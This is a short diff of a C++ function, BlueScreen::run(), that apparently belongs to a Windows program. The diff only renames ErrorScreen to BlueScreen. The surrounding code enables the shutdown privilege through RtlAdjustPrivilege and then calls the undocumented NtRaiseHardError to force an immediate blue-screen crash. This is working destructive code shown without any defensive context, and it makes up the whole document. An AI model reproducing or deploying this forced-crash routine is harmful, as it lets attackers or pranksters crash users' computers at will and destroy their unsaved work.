@@ -13,14 +13,14 @@ void BlueScreen::run() {
 
     HMODULE RtlLib = LoadLibraryA("ntdll.dll");
     if (RtlLib != nullptr) {
-        ErrorScreen::adjustPrivilege = reinterpret_cast<RtladjustPrivileg>(GetProcAddress(RtlLib, "RtlAdjustPrivilege"));
-        ErrorScreen::adjustPrivilege(19, TRUE, FALSE, &dumpy);
+        BlueScreen::adjustPrivilege = reinterpret_cast<RtladjustPrivileg>(GetProcAddress(RtlLib, "RtlAdjustPrivilege"));
+        BlueScreen::adjustPrivilege(19, TRUE, FALSE, &dumpy);
     }
 
     HMODULE NtRaiseLib = GetModuleHandleW(L"ntdll.dll");
     if (NtRaiseLib != nullptr) {
-        ErrorScreen::raiseHardError = reinterpret_cast<NtRaiseHardError>(GetProcAddress(NtRaiseLib, "NtRaiseHardError"));
-        ErrorScreen::raiseHardError(STATUS_FLOAT_DIVIDE_BY_ZERO, 0, 0, 0, 6, &dumpy2);
+        BlueScreen::raiseHardError = reinterpret_cast<NtRaiseHardError>(GetProcAddress(NtRaiseLib, "NtRaiseHardError"));
+        BlueScreen::raiseHardError(STATUS_FLOAT_DIVIDE_BY_ZERO, 0, 0, 0, 6, &dumpy2);
     }
     
 }
